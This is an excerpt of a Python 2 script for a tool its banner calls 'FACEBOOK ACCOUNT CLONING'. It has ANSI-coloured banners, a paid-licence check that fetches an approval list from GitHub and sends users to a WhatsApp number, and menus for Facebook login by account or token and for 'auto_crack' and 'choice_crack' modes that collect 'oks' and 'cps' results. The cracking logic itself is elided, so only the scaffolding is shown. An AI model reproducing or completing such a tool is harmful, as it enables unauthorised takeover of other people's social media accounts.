...
__author__ = 'Khan'
__copyright = 'All rights reserved . Copyright  Chidi Khan'
...
\033[1;96m #      #    # # #    # # 
\033[1;97m ###### #    # # ###### #
\033[1;94m Chidiebere Khan                              
 \033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n
 \033[32;1mCreator \033[37;1m: \033[33;1mChidiebebere Khan
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Chidieb/booms/main/server.txt').text
    if to in r:
        ...
        print ' \x1b[1;92mNote Approval Is Not For Free '
        print ' \x1b[1;92mCopy the id and send to admin'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+2348109040651')
        reg()
...
def log_menu_s():
    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Chidi\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80chidi\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80chidi\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mChidi Khan\x1b[1;91m'
    print 47 * '-'
